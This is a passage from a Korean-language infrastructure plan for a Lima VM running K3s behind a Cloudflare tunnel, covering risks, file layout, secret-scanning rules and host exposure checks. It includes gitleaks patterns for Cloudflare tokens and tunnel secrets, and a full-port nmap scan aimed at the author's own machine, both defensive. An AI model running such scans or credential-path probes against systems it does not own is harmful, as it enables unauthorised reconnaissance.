3. **원본 인증서 검증이 "조용히 꺼짐"** — cloudflared가 Traefik 기본 자체 서명 인증서나 staging 인증서 때문에 502를 내면 `noTLSVerify: true`로 "해결"하고 싶어진다. → Task 9의 `audit_tunnel_config`가 `noTLSVerify: true`와 `originServerName` 누락을 거부하고, 터널은 prod 인증서가 Ready가 된 뒤(Task 8 이후)에만 연다.
4. **apex/www(Vercel) 오염** — DNS-01 토큰은 zone 전체 레코드를 고칠 수 있다. → Task 5에서 apex/www 기준선(DNS-only, Vercel IP)을 저장하고, Task 5·8·9·10·12 끝마다 `m1-dns-baseline.sh`로 불변과 비프록시(`cf-ray` 없음)를 확인한다.
5. **Let's Encrypt prod 한도 소진** — `promote-prod.sh`는 세 Certificate가 staging으로 Ready가 아니면 거부한다. DNS-01 전파 실패(토큰 권한, IP 필터, CAA)로 재시도가 반복되지 않게 Task 5에서 CAA와 토큰 권한을 먼저 검증한다.
6. **default-deny에서 kubelet 프로브 차단** — 기존과 같다 (Task 7 Step 5).
7. **VM 생명주기 (VM은 보여줄 때만 켬)** — `limactl stop/start` 뒤 K3s, cloudflared가 살아나야 하고, Mac 잠자기 후 VM 시계가 틀어지면 TLS·TOTP(M4)가 깨진다. VM이 꺼져 있는 동안 로그 보존 기한(7일)도 지나간다. → 시연은 `make demo-up`(VM 시작 + `caffeinate`로 잠자기 방지 + 시계 차이 확인)과 `make demo-down`(`caffeinate` 해제 + VM 정지)으로만 켜고 끈다. 로그는 부팅 시 logrotate가 회전한다. Task 12에서 stop/start와 잠자기 후 `make verify-m1`, 시계 동기화, 로그 보존을 확인한다.
8. **Bot Fight Mode와 자동 검증의 충돌** — Bot Fight Mode는 끌 수 있을 뿐 WAF Skip으로 예외를 줄 수 없고, curl 같은 자동화 요청에 챌린지를 걸 수 있다. → `edge_fetch`가 `EDGE_CLASS=CHALLENGED`를 따로 표시하고, 기대와 다른 챌린지는 `BOT_CHALLENGED`로 보고하며 **PASS로 세지 않는다** (Task 10). R2(콘솔 챌린지)는 같은 호스트의 `/`가 챌린지 없이 열린다는 양성 대조로 구분한다.
9. **부재 검사의 거짓 PASS** — 파이프 안 grep, 느슨한 `--match`, 로컬 TLS 라이브러리가 TLS 1.1을 못 쓰는 경우의 rc 35 등은 "차단됨"으로 잘못 통과할 수 있다. → 스크립트 규칙의 부재 검사 패턴과 서버 측 메시지 `--match`(`alert protocol version`)를 리뷰에서 확인한다.

---

## File Structure

| 경로 | 책임 |
|---|---|
| `.gitignore`, `.pre-commit-config.yaml`, `.gitleaks.toml` | 비밀 미커밋 (Task 1 + Task 2 Step 0) |
| `config/cluster.env.example` | 변수 목록 (커밋). 실제 값은 `config/cluster.env` (gitignore) |
| `scripts/lib/assert.sh`, `scripts/lib/env.sh` | Task 1 산출물 (`env.sh`는 Task 2 Step 0에서 변경) |
| `scripts/hooks/check-cluster-values.sh` | 비공개 env 값 커밋 방지 (Task 2 Step 0에서 skip 목록 확장) |
| `infra/lima/secure-ax.yaml` | Lima VM 정의 (2 CPU / 12 GiB / 100 GiB, `mounts: []`, `networks: []`, 포트 포워드 6443만) |
| `scripts/host/bootstrap.sh` | VM 하드닝, 시간 동기화 (VM에서 실행, 멱등, Lima 전용 명령 없음, 방화벽 없음 — Q13) |
| `scripts/host/install-k3s.sh` | 고정 버전 K3s 설치 (VM에서 실행, 멱등) |
| `scripts/host/install-cloudflared.sh`, `scripts/host/cloudflared/config.yml.tmpl`, `scripts/host/systemd/cloudflared.service` | 터널 커넥터 (VM 호스트) |
| `scripts/host/logrotate/secure-ax-traefik`, `scripts/host/systemd/logrotate.timer.d/secure-ax-boot.conf`, `scripts/host/systemd/logrotate.service.d/secure-ax-prune.conf`, `scripts/host/install-log-retention.sh` | Traefik 접근 로그 hostPath 디렉터리, logrotate `daily` + `maxage 7` + `ifempty`, 7일 초과 파일 정리 안전망, 부팅 시 회전 (Q12, 결정 N3) |
| `scripts/cf/export-config.sh`, `scripts/cf/check-export-clean.sh` | 읽기 전용 토큰으로 Cloudflare 설정 JSON 내보내기·정규화, 커밋 전 식별자·비밀 부재 검사 (Q7, 결정 N2b) |
| `scripts/demo/demo-up.sh`, `scripts/demo/demo-down.sh` | 시연 켜기(VM 시작, `caffeinate`, 시계 차이 확인)·끄기 |
| `README.md` | 최소 소개, 비용 문구, 시연 정책, 문서 링크 (Q21, 결정 N4) |
| `scripts/verify/lib/remote.sh` | `vm_run` (스크립트를 VM으로 복사해 실행, 종료 코드 전달) |
| `scripts/verify/lib/listeners.sh`, `scripts/verify/lib/http.sh`, `scripts/verify/lib/tunnelcfg.sh`, `scripts/verify/lib/cfapi.sh`, `scripts/verify/lib/k8s.sh` | 순수 셸 파서·헬퍼 (단위 테스트 대상) |
| `scripts/verify/m1-*.sh`, `scripts/verify/edge-geo-probe.sh` | Task별 완료 기준 검증 |
| `scripts/verify/lib/scrub.sh`, `scripts/verify/check-evidence-clean.sh` | 공개 저장소용 증거 치환·누출 검사 (Task 3) |
| `scripts/cert/promote-prod.sh` | staging→prod 전환 가드 |
| `.github/workflows/edge-geo-probe.yml` | 국가 차단 외부 관측 (수동 `workflow_dispatch`, 비밀 없음 — Q8) |
| `k8s/platform/traefik/` | `HelmChartConfig`, `TLSOption` |
| `k8s/platform/cert-manager/` | Helm values, `ClusterIssuer` 2개(DNS-01 Cloudflare) |
| `k8s/components/traefik-middlewares/` | 네임스페이스마다 복제되는 미들웨어 (`https-redirect`, `sec-headers`, `body-limit`) |
| `k8s/base/namespaces/` | ns 5개, PSA 라벨, default-deny, N1 |
| `k8s/base/dummy/` | 세 호스트용 더미 앱, `Certificate` 3개 |
| `k8s/overlays/local/` | 호스트명·issuer 패치 (실사용) |
| `k8s/overlays/oci/` | **자리만** (`README.md`: "future, 미검증") |
| `attacks/netmatrix.sh`, `attacks/lib/netmatrix.sh`, `attacks/netmatrix.expected.tsv`, `attacks/probe-pod.yaml.tmpl` | NP 실측 대 기대 매트릭스 |
| `tests/scripts/` | 순수 셸 함수 단위 테스트와 fixture |
| `tests/fixtures/psa-violation.yaml` | PSA 거부 확인용 |
| `Makefile` | `verify-m1`, `netmatrix`, `test-scripts`, `lan-scan`, `demo-up`, `demo-down` |
| `docs/runbooks/m1-lima-vm.md`, `m1-cloudflare-account.md`, `m1-cloudflare-token.md`, `m1-cert-manager.md`, `m1-kubeconfig.md`, `m1-tunnel.md`, `m1-cloudflare-edge.md` | 수동 작업 절차 |
| `docs/runbooks/future-oci-vm.md` | **future**: 기존 계획 Task 2·3(OCI VM, 호스트 방화벽) 내용을 옮겨 두기만 함 (실행·검증 안 함) |
| `docs/evidence/m1/`, `docs/cost/` | 캡처, 검증 출력, 청구 화면 |
| `k8s/VERSIONS.md` | 고정 버전·digest·sha256 |

**[Claude 결정, 기존 유지]** 미들웨어는 `kube-system` 하나에 두고 Traefik `allowCrossNamespace`를 켜는 대신, Kustomize component로 각 앱 네임스페이스에 복제한다.

---

### Task 1: 저장소 뼈대와 비밀 위생 — **완료 (7ca8306, 93e0deb)**

원래 범위와 Step은 `docs/superpowers/plans/2026-11-11-m1-infra-foundation.md`의 Task 1을 본다. 리뷰 4회차 후 승인, `github.com/whoareryu/safedesk`(공개)에 push, secret scanning + push protection 켬. 남은 minor(R4-1~R4-4)는 M1 최종 리뷰에서 분류한다.

이후 Task가 쓰는 **실제 인터페이스** (`scripts/lib/assert.sh` 머리 주석이 기준):

- `assert_eq <expected> <actual> <msg>`, `assert_contains <haystack> <needle> <msg>`(빈 needle은 FAIL), `assert_fails <msg> -- <cmd...>`, `assert_succeeds <msg> -- <cmd...>`, `assert_succeeds_strict <msg> -- <cmd...>`(자식 `bash -euo pipefail`, 함수는 `export -f` 필요), `assert_counts`, `assert_summary`.
- `assert_fails_with <msg> [--rc n] [--match ERE] -- <cmd...>` — **모든 거부/차단 검사에 필수**. `--rc`/`--match` 중 하나 이상, 각각 한 번. rc 0, 126, 127은 항상 FAIL. `--match`는 stdout+stderr 전체에 `grep -E`(LC_ALL=C).
- `assert_summary`는 실패나 0건이면 **return 1**(exit 아님). 검증 스크립트의 마지막 명령으로 둔다.
- 실패해야 할 명령이 성공하면 출력은 찍지 않고 rc와 크기만 찍는다. `ASSERT_NO_OUTPUT=1`이면 모든 실패 경로에서 출력 꼬리를 숨긴다 (토큰을 다루는 검사에서 사용).
- `scripts/lib/env.sh`의 `load_env` (Task 2 Step 0에서 변경), `scripts/hooks/check-cluster-values.sh`, `.gitleaks.toml`(DuckDNS·Tailscale 규칙, 런타임 생성 fixture로 테스트), `Makefile`의 `test-scripts`, `verify-m1`(자리, Task 12에서 채움).

---

### Task 2: Lima VM 정의와 호스트 검증

**Files:**
- Modify (Step 0): `scripts/lib/env.sh`, `config/cluster.env.example`, `scripts/hooks/check-cluster-values.sh`, `.gitleaks.toml`, `.gitignore`, `tests/scripts/test_check_cluster_values.sh`, `tests/scripts/test_gitleaks_rules.sh`
- Create (Step 0): `tests/scripts/test_env.sh` (이미 있으면 Modify)
- Create: `infra/lima/secure-ax.yaml`, `docs/runbooks/m1-lima-vm.md`, `scripts/verify/m1-host.sh`(VM에서 실행), `scripts/verify/m1-lima.sh`(Mac에서 실행), `scripts/verify/lib/remote.sh`, `docs/runbooks/future-oci-vm.md`, `k8s/overlays/oci/README.md`

**Interfaces:**
- Consumes: `assert.sh`, `env.sh`
- Produces:
  - (Step 0) `load_env` 필수 변수: 공통 `TARGET HOST_SAFEDESK HOST_MINISHOP HOST_RELAY CF_ZONE ACME_EMAIL K3S_VERSION`, `TARGET=local`이면 추가로 `LIMA_INSTANCE TUNNEL_NAME`. `PUBLIC_IP`, `TS_IP`는 필수에서 뺀다. 선택 변수 `TUNNEL_ID`(비공개)는 값이 있으면 export한다. `TARGET=oci` → stderr `TARGET=oci is not implemented yet (future)`, exit 2. 그 밖의 값 → stderr `unsupported TARGET: <값> (expected: local)`, exit 2. 런타임에 알 수 있는 `NODE_IP`는 env 파일에 두지 않고 스크립트가 조회한다.
  - Lima 인스턴스 `$LIMA_INSTANCE`. 저장소는 VM에 마운트하지 않으므로 `scripts/verify/lib/remote.sh`의 `vm_run [--root] <script> [args...]`가 `scripts/lib/`와 대상 스크립트를 `limactl copy`로 VM `/tmp/secure-ax/`에 보내고 `limactl shell $LIMA_INSTANCE -- bash /tmp/secure-ax/<script> [args]`(`--root`이면 `-- sudo -n bash ...`)로 실행해 종료 코드를 그대로 돌려준다. 권한 모델: VM에서 도는 스크립트 중 루트가 필요한 것(`m1-hardening.sh` 전체, 그리고 `m1-k3s.sh`·`m1-traefik.sh`·`m1-tunnel.sh`가 VM에 보내는 보조 스크립트)은 `vm_run --root`로만 부르고, 그 스크립트는 첫 줄에서 `assert_eq 0 "$(id -u)" "running as root"`로 확인해 비루트 실행이 거짓 PASS가 되지 않게 한다. `--root`가 필요한 검사: `sshd -T`, `k3s secrets-encrypt status`, `/etc/rancher/k3s/k3s.yaml` 권한, `logrotate -f`, `/var/log/traefik` 파일 조작, `/root`·`/etc/cloudflared` 탐색, `ss -p`. `sudo -n`이 비밀번호를 요구하면 rc 1로 실패해 드러난다 (Lima 기본 사용자는 비밀번호 없는 sudo).
  - `m1-lima.sh` — Mac에서 실행. 인스턴스 설정만 검사한다 (행동 검사는 Task 3의 `m1-exposure.sh`).

- [ ] **Step 0: Task 1 인터페이스 변경 (Q23)** — 실패 테스트 → 수정 → 통과 → 커밋.
  1. 실패하는 테스트 작성:
     - `tests/scripts/test_env.sh` (임시 env 파일, `CLUSTER_ENV_FILE`로 지정, 각 경우를 `bash -c '. scripts/lib/env.sh; load_env'`로 실행):
       - `TARGET=oci` → `assert_fails_with "oci target not implemented" --rc 2 --match 'TARGET=oci is not implemented yet' -- ...`
       - `TARGET=staging` → `assert_fails_with "unknown target rejected" --rc 2 --match 'unsupported TARGET: staging' -- ...`
       - `TARGET=local`에서 `LIMA_INSTANCE` 누락 → `assert_fails_with "local requires LIMA_INSTANCE" --rc 2 --match 'missing required variables:.*LIMA_INSTANCE' -- ...`
       - `TARGET` 누락 → `assert_fails_with "TARGET required" --rc 2 --match 'missing required variables:.*TARGET' -- ...`
       - `PUBLIC_IP`·`TS_IP` 없이 나머지가 모두 있는 local env → `assert_succeeds`
       - `TUNNEL_ID`에 가짜 값(테스트 안에서 생성)을 넣으면 자식 프로세스에서 보임
     - `tests/scripts/test_check_cluster_values.sh`: `TARGET CF_ZONE LIMA_INSTANCE TUNNEL_NAME`의 값이 staged 줄에 있어도 훅 rc 0. `TUNNEL_ID` 값이 있으면 `assert_fails_with "TUNNEL_ID blocked" --rc 1 --match 'value of TUNNEL_ID from config/cluster.env appears' -- run_hook` (`ACME_EMAIL`도 같은 방식).
     - `tests/scripts/test_gitleaks_rules.sh` (기존처럼 **가짜 값을 실행 중에 생성**, 저장소에 키 모양 문자열을 남기지 않음):
       - 양성: `CF_API_TOKEN=<40자>`, `stringData:` 아래 `api-token: <40자>`, cloudflared 자격 증명 JSON의 `"TunnelSecret": "<base64>"`, 원격 관리형 터널 토큰(`eyJhIjoi`로 시작하는 base64), `-----BEGIN ARGO TUNNEL TOKEN-----` 블록
       - 음성: `config.yml.tmpl`의 `${TUNNEL_ID}`, `CF_API_TOKEN=<placeholder>`, `"TunnelSecret": "<redacted>"`
  2. `make test-scripts` → FAIL 확인.
  3. 구현:
     - `env.sh`: 위 Produces대로. bash 3.2 호환(연관 배열 없이 문자열 목록). `TARGET` 값 검사는 필수값 확인 뒤에 한다.
     - `config/cluster.env.example`: `TARGET=local`, `HOST_SAFEDESK=safedesk.whoareryu.cloud`, `HOST_MINISHOP=minishop.whoareryu.cloud`, `HOST_RELAY=relay.whoareryu.cloud`, `CF_ZONE=whoareryu.cloud`(모두 공개 값), `LIMA_INSTANCE=`, `TUNNEL_NAME=`, `ACME_EMAIL=`(비공개), `K3S_VERSION=`, `TUNNEL_ID=`(비공개, Task 9에서 채움). DuckDNS·Tailscale·OCI 주석 삭제.
     - `check-cluster-values.sh`: skip 목록을 `HOST_* | K3S_VERSION | TARGET | CF_ZONE | LIMA_INSTANCE | TUNNEL_NAME`으로. 머리 주석도 갱신. `TUNNEL_ID`, `ACME_EMAIL`은 계속 검사 대상.
     - `.gitleaks.toml`: gitleaks 기본 Cloudflare 규칙이 `cloudflare` 키워드에 의존하는지 위 fixture로 확인하고, 키워드 없는 `CF_API_TOKEN=`/`api-token:` 형태를 잡는 규칙 `cloudflare-api-token-env` 추가. `cloudflared-tunnel-credentials`(`"TunnelSecret"` 키), `cloudflared-tunnel-token`(`eyJhIjoi` 접두), `cloudflared-origin-cert`(`-----BEGIN ARGO TUNNEL TOKEN-----`) 추가. 실제 토큰·`cert.pem`의 길이·문자 집합·머리줄은 Task 5·9에서 **형식만** 확인해 규칙을 좁힌다 (값은 기록하지 않음). DuckDNS·Tailscale 규칙은 그대로 둔다.
     - `.gitignore`: `.cloudflared/`, `config/cloudflared/`, `config/*.token`, `docs/evidence/**/cf-export-raw/` 추가 (`*.pem`은 이미 있음).
  4. `make test-scripts` → PASS, `shellcheck` 통과, `gitleaks detect --no-banner` rc 0.
  5. 커밋 `chore: env vars and secret rules for local+cloudflare target`
- [ ] **Step 1: 실패하는 검증 작성.**
  - `m1-host.sh` (VM): `uname -m` = `aarch64`; `nproc` = 2; `MemTotal` 11~12.5 GiB; `VERSION_ID` = `24.04`; 루트 FS ≤ 100 GiB; **Mac 공유 마운트 없음**: `findmnt -rn -o FSTYPE > $tmp/fs` 성공과 파일이 비어 있지 않음(루트 FS가 항상 있음)을 assert → `assert_fails_with "no Mac share mounts" --rc 1 -- grep -Eqx "virtiofs|9p|fuse\.sshfs" "$tmp/fs"` (findmnt의 rc 1은 "없음"과 "오류"를 함께 뜻하므로 직접 판정하지 않는다).
  - `m1-lima.sh` (Mac): `limactl list --json $LIMA_INSTANCE`(설정 필드 경로는 실행 시 Lima 버전으로 확인, 필요하면 `limactl list --format '{{json .Config}}'`)를 파일로 받는 것을 먼저 assert하고 jq로:
    - `status` = `Running`, `vmType` = `vz`, `cpus` = 2, `memory` = 12 GiB(12884901888), `disk` = 100 GiB(107374182400)
    - `mounts` 길이 = 0
    - **`networks` 길이 = 0** (vzNAT/shared/bridged 없음 — Review Focus 2, Q13)
    - `portForwards`의 **처음 두 규칙**이 순서대로 정확히 (1) `guestPort 6443, hostIP 127.0.0.1, hostPort 6443` (2) `guestIP 0.0.0.0, guestIPMustBeZero false, proto any, ignore true`. Lima가 사용자 규칙 뒤에 기본 `127.0.0.1` 1-65535 규칙을 덧붙일 수 있으나, 첫 일치 규칙이므로 catch-all ignore 뒤의 규칙은 도달하지 않는다 (그래서 개수가 아니라 처음 두 규칙을 본다)
    - 저장소의 `infra/lima/secure-ax.yaml`과 인스턴스 설정의 위 필드가 같음 (드리프트)
- [ ] **Step 2:** 실행 → 인스턴스 없음으로 FAIL 확인.
- [ ] **Step 3:** `infra/lima/secure-ax.yaml` 작성 **[수동 확인 필요: Lima 버전 ≥ 2.0]**:
  - `base: template:ubuntu-24.04` (또는 템플릿 내용을 복사해 이미지 digest 고정 — 실행 시 결정, `VERSIONS.md` 기록). **상속 확인:** `limactl tmpl copy --embed infra/lima/secure-ax.yaml -`(또는 같은 기능의 명령)로 합성 결과를 보고 `mounts`가 비어 있는지 확인한다. 기본 템플릿의 홈 마운트가 병합돼 남으면 `base: template:_images/ubuntu-24.04`(이미지 정의만)로 바꾸고 이유를 기록한다 **[Claude 제안]**
  - `vmType: vz`, `cpus: 2`, `memory: 12GiB`, `disk: 100GiB`, `mounts: []`, `networks: []`, `containerd: {system: false, user: false}`
  - `portForwards`(위에서부터 첫 일치):
    1. `guestPort: 6443, hostIP: 127.0.0.1, hostPort: 6443`
    2. `guestIP: 0.0.0.0, guestIPMustBeZero: false, proto: any, ignore: true` (catch-all; Lima ≥ 2.0 의미 기준)
  - 파일 머리 주석: "로컬에는 호스트 방화벽이 없다(Q13). `networks`를 추가하거나 포워드 규칙을 바꾸면 VM이 직접 노출된다."
- [ ] **Step 4 (MANUAL, 사용자):** 런북 `m1-lima-vm.md`: `brew install lima`, `limactl --version`을 `VERSIONS.md`에 기록, `limactl create --name=$LIMA_INSTANCE infra/lima/secure-ax.yaml && limactl start $LIMA_INSTANCE`.
- [ ] **Step 5:** `vm_run scripts/verify/m1-host.sh`와 `m1-lima.sh` → PASS 확인. `vm_run --root`가 동작하는지(`sudo -n true`)도 여기서 확인한다.
- [ ] **Step 6:** `docs/runbooks/future-oci-vm.md`: 기존 계획 Task 2(OCI VM·비용 가드레일)와 Task 3의 호스트 방화벽 부분을 옮기고 맨 위에 "미검증, 실행하지 않음. OCI 이전 시 인바운드 공개 전에 호스트 방화벽을 먼저 도입한다(Q13)"를 쓴다. `k8s/overlays/oci/README.md`에 "TARGET=oci 자리. 이 디렉터리는 M1에서 빌드·적용하지 않는다"만 쓴다.
- [ ] **Step 7: 커밋** `feat(host): lima vm definition with no mounts, no extra networks, 6443-only forward`

---

### Task 3: 호스트 하드닝과 인바운드 노출 증명 (호스트 방화벽 없음)

**Files:**
- Create: `scripts/host/bootstrap.sh`, `scripts/verify/m1-hardening.sh`(VM), `scripts/verify/m1-exposure.sh`(Mac), `scripts/verify/lib/listeners.sh`, `tests/scripts/test_listeners_parse.sh`, `tests/scripts/fixtures/lsof-*.txt`, `tests/scripts/fixtures/ss-*.txt`, `scripts/verify/m1-lan-scan.sh`(Mac), `tests/scripts/test_nmap_parse.sh`, `tests/scripts/fixtures/nmap-*.gnmap`, `docs/evidence/m1/lan-scan-*.gnmap`, `scripts/verify/lib/scrub.sh`, `scripts/verify/check-evidence-clean.sh`, `tests/scripts/test_scrub_evidence.sh`
- Modify: `.pre-commit-config.yaml`(`docs/evidence/`·`docs/cost/` 텍스트 파일에 `check-evidence-clean` local 훅)

**Interfaces:**
- Consumes: `env.sh`, Task 2의 `vm_run`
- Produces:
  - `bootstrap.sh` (VM, root, 멱등): unattended-upgrades, `sshd_config.d/99-hardening.conf`, `systemd-timesyncd`. **방화벽 코드 없음** (Q13). Lima 전용 명령 없음.
  - `scripts/verify/lib/listeners.sh`:
    - `lima_listeners <lsof_file> [<pid_file>]` — `lsof -nP -iTCP -sTCP:LISTEN` 또는 `lsof -nP -iUDP` 출력에서 COMMAND가 `limactl` 또는 `ssh`인 줄의 주소(`127.0.0.1:6443` 형식)를 C 로캘로 정렬·중복 제거해 한 줄에 하나씩 출력. **바인드/리슨 소켓만**: NAME에 `->`가 든 연결된 소켓 줄(예: 바깥으로 나가는 UDP `a->b`)과 상태가 `(LISTEN)`이 아닌 TCP 줄은 라이브러리 안에서 버린다 (상대 주소가 출력에 섞이지 않음). 선택 인자 `<pid_file>`(한 줄에 PID 하나)을 주면 lsof의 PID 열이 그 목록에 있는 줄만 남긴다 (COMMAND 조건과 함께; 빈 파일이면 빈 출력). 인자 하나일 때는 위 두 규칙 외에는 기존 동작 그대로라 Step 1 fixture가 그대로 성립한다. *(수정 1회차, 사용자 결정)*
    - `nmap_port_totals <gnmap_file>` — `Ports`/`Ignored State` 필드가 있는 `Host:` 줄마다 nmap이 다룬 포트 수(나열된 항목 + `Ignored State` 개수)를 출력. 전 범위(`-p-`) 단일 호스트 스캔이면 `65535`. *(수정 1회차 추가)*
    - `guest_listeners <ss_file>` — `ss -Hltnu` 출력에서 `proto addr:port`를 정렬해 출력 (기록용).
    - `open_tcp_ports <gnmap_file>` — nmap `-oG` 출력의 `Ports:` 필드에서 `open` TCP 포트만 오름차순, 한 줄에 하나씩 출력 (`filtered`·`closed` 제외).
  - `m1-lan-scan.sh --vm-off <gnmap> --vm-on <gnmap> [--control-port 18090]` — Mac에서 실행. **같은 LAN의 다른 실제 기기**(기본 증거) 또는 대체 수단인 Mac의 **Docker 컨테이너**(nmap 이미지, digest 고정)에서 Mac LAN IP를 스캔한 두 결과(VM 꺼짐/켜짐)를 비교한다 (S1 대체 증거). 스캔 명령: `nmap -n -Pn -p- -T4 -oG <파일> <LAN_IP>`. 증거 파일 머리에 스캔한 기기 종류(기기 이름·IP는 적지 않음), 대조 포트, 방화벽 허용 여부를 적는다. Docker로 스캔했다면 "실제 LAN이 아니라 Docker Desktop VM 네트워크를 거쳤을 수 있다"는 한계 문장이 머리에 있어야 하며, `m1-lan-scan.sh`는 머리의 `scanner: docker`이면 그 문장이 있는지 확인한다 (없으면 FAIL).
  - `m1-exposure.sh [--stage base|k3s|tunnel]` — Mac에서 실행. 단계별 기대 Mac 리스너: `base` = Lima SSH 포트(있으면), `k3s`·`tunnel` = 여기에 `127.0.0.1:6443` 추가. SSH 포트는 `limactl list --json`의 SSH 로컬 포트로 얻고, 값이 없으면(vsock SSH) 기대 목록에서 뺀다.
  - `scripts/verify/lib/scrub.sh`: `scrub_evidence <file>` — 제자리 치환. Mac 호스트 이름(`scutil --get LocalHostName`, `scutil --get ComputerName`, `hostname -s`), `$HOME`과 사용자 이름(`/Users/<name>` → `/Users/<user>`), MAC 주소(`xx:xx:xx:xx:xx:xx` → `<MAC>`), `LAN_IP`·`GUEST_IP`·집 IP, `TUNNEL_ID`, 32자리 16진 ID를 자리표시자로 바꾼다. `scripts/verify/check-evidence-clean.sh <file...>` — 위 값과 IP·UUID·이메일·토큰 모양이 남아 있으면 종류만 출력하고 exit 1 (값은 출력하지 않음). 이후 Task의 모든 텍스트 증거는 저장 전에 `scrub_evidence`를 거친다.

- **계획과 달라진 점 (Task 3 수정 1회차, 사용자 결정) — 파트 A:**
  - `lima_listeners`: 위 인터페이스 변경(선택 `<pid_file>`, `->` 연결 소켓·비 LISTEN TCP 줄 제거). Lima 2.2 실제 출력 모양(호스트 에이전트 DNS 포트, 연결된 UDP `a->b`, `[::1]:6443`, ESTABLISHED/CLOSE_WAIT, 다른 PID의 `*:53`/`*:10250`)을 담은 fixture(가짜 값)를 추가했다. `open_tcp_ports`는 탭이 공백으로 바뀐 `-oG` 파일도 읽는다.
  - `scrub_evidence`/`check-evidence-clean`: 한 awk 엔진을 함께 쓴다 (검사 = "치환이 바꿀 종류" + IPv4·이메일·토큰). 추가 범위: IPv6 모양(전역 `2000::/3`, ULA `fc00::/7`, 링크로컬 `fe80::/10` → `<IPV6>`, EUI-64는 종류 `mac`; `::`, `::1`, 멀티캐스트, `2001:db8::/32`, `fe80::1` 같은 작은 인터페이스 ID는 허용), MAC 모든 흔한 형태(`a:b:c:d:e:f` 0 생략, `AA-BB-…`, `aabb.ccdd.eeff`), 호스트 이름·실명 변형(곧은/굽은/빠진 아포스트로피, `\ `, `%20`, `\032`, `-`, 공백 제거, URL 인코딩, 대소문자 무시)과 `id -F` 실명(및 3자 이상 단어, MacBook/Pro/월·요일 등 불용어 제외), 사용자 이름 대소문자 무시·글자 경계(`name_x`, `name2`도 잡음). env IP는 숫자 경계로만 치환(`a.b.c.250`에 `<LAN_IP>0` 없음)하고 대시 형태(`ip-a-b-c-d`)도 치환한다. 버전 문자열 예외는 `v` 뒤와 1~3단 버전+대시 뒤(`6.8.0-1.2.3.4`)로 좁혔다 (`host-a.b.c.d`, `a_…`, 범위 `a.b.c.d-e.f.g.h`의 둘째 주소, `ip-a-b-c-d`는 IP). 자리표시자나 `/Users/` 안에 들어 있는 이름(host, mac, user, lan 등)은 치환·검사에서 뺀다 (멱등성). 모양 치환이 이름 치환보다 먼저 돈다.
  - 공개 IP 허용 목록 파일 `config/evidence-public-ips.txt`(커밋, 지금은 비어 있음, Task 5에서 apex/www·리졸버 주소를 채움). 한 줄에 주소 또는 CIDR, 사설·루프백·링크로컬·CGNAT·ULA 항목은 rc 2로 거부. `EVIDENCE_PUBLIC_IPS_FILE`로 바꿀 수 있다 (테스트).

- **계획과 달라진 점 (Task 3 수정 1회차, 사용자 결정) — 파트 C:**
  - (a) `m1-exposure.sh`의 Mac 리스너 검사는 이 인스턴스의 PID(`limactl list --json`의 `.dir`을 명령 줄에 가진 프로세스)로 범위를 좁힌다 (`lima_listeners <lsof> <pid_file>`). 다른 limactl/ssh 프로세스(예: Colima)의 비루프백 포트는 `WARN` 줄에 포트 번호만 출력한다 (경로·사용자 이름 없음).
  - (b) TCP 기대 목록에 Lima 2.2 호스트 에이전트의 임의 `127.0.0.1` DNS TCP 포트(`ha.stderr.log`의 `Start tcp DNS listening on`)를 넣는다.
  - (c) UDP는 "limactl UDP 소켓 없음" 대신 **바인드된 UDP 소켓 = 호스트 에이전트 UDP DNS 포트 정확히 하나**(`ha.stderr.log`의 `Start udp DNS listening on: 127.0.0.1:N`)로 판정한다. 연결된 `a->b` 소켓(바깥으로 나가는 NTP·DNS)은 리스너가 아니므로 `lima_listeners`가 버리고, 그 밖의 바인드된 UDP 소켓은 모두 FAIL이다.
  - 프로브를 띄운 상태에서 TCP/UDP 목록을 다시 떠서 같은 기대값과 비교한다 (예상 밖 주소·포트로의 포워드 검출). guest IP·LAN IP를 먼저 구해 `GUEST_IP`·`LAN_IP`로 export한 뒤 guest 리스너 증거를 치환하고 `check-evidence-clean`으로 확인한다.
  - `m1-lan-scan.sh`: 입력은 치환된 사본이라 모든 `Host:` 줄이 `Host: <LAN_IP> ()`여야 한다 (다른 주소·여러 대상 FAIL). 전 범위 증명: nmap 명령 줄에 `-n`, `-Pn`, `-p-`(또는 `-p1-65535`/`-p 1-65535`), `-oG`가 있고 `nmap_port_totals`가 각 `Host:` 줄에서 65535. 방화벽 허용 시 `firewall-python-resolved:`(실제 경로)도 기록·확인한다.
  - Docker 대체 스캔: 런타임을 `docker --context desktop-linux`(Docker Desktop)로 고정하고 머리에 `docker-context:`·`docker-runtime:`·`nmap-image:`를 적는다. 한계 문장은 "스캔이 Mac 안(Docker Desktop VM)에서 출발해 실제 LAN 경로와 macOS 애플리케이션 방화벽을 거치지 않았다"로 바꿨다 (위 인터페이스의 "거쳤을 수 있다" 문장 대체). `--lan-ip`는 이 Mac의 `ifconfig` 주소여야 한다. 읽기 전용 사전 점검(`make lan-scan-guard`, 스캔 전 자동 실행): 어떤 limactl/ssh 프로세스(Lima·Colima 인스턴스, ssh 터널)든 비루프백 리스너를 가지면 FAIL. Colima는 스캔 시간 내내 꺼 둔다. `make lan-scan ... LAN_SCAN_ARGS=--dry-run`은 점검만 하고 스캔하지 않는다. nmap 이미지·digest는 `k8s/VERSIONS.md`에 기록했다.
  - 런북 대조 리스너는 빈 임시 디렉터리를 서빙한다 (`--directory "$(mktemp -d)"`).

- [ ] **Step 1: 실패하는 테스트 작성** `test_listeners_parse.sh`. fixture:
  - `limactl` 리스너 `127.0.0.1:6443`, `127.0.0.1:60022`와 무관한 프로세스(`rapportd *:49152`) → `127.0.0.1:6443`, `127.0.0.1:60022` 두 줄
  - `limactl`이 `*:443`에 바인드 → 출력에 `*:443` 포함 (검증 스크립트가 잡아야 함)
  - UDP fixture에서 `limactl` UDP 소켓 → 출력에 포함
  - 리스너 없음 → 빈 출력
  - `ss` fixture → `tcp 0.0.0.0:22` 형식 목록
  - nmap fixture (`test_nmap_parse.sh`): `22/open, 6443/open, 18090/open` → `22`, `6443`, `18090` 세 줄 / `80/open, 6443/filtered` → `80` / 열린 포트 없음 → 빈 출력
  - `test_scrub_evidence.sh`: 실행 중 만든 가짜 호스트 이름·사용자 경로·MAC·IP·UUID가 든 파일 → `scrub_evidence` 뒤 각 값이 없음(`assert_fails_with --rc 1 -- grep -Fq "<값>" <파일>`)과 `check-evidence-clean.sh` rc 0. 치환 전 파일 → `assert_fails_with "evidence leak detected" --rc 1 --match '^check-evidence-clean: (hostname|user-path|mac|ip|uuid)' -- scripts/verify/check-evidence-clean.sh <파일>`
- [ ] **Step 2:** `make test-scripts` → FAIL → `awk`로 구현 → PASS.
- [ ] **Step 3: 실패하는 검증 작성.**
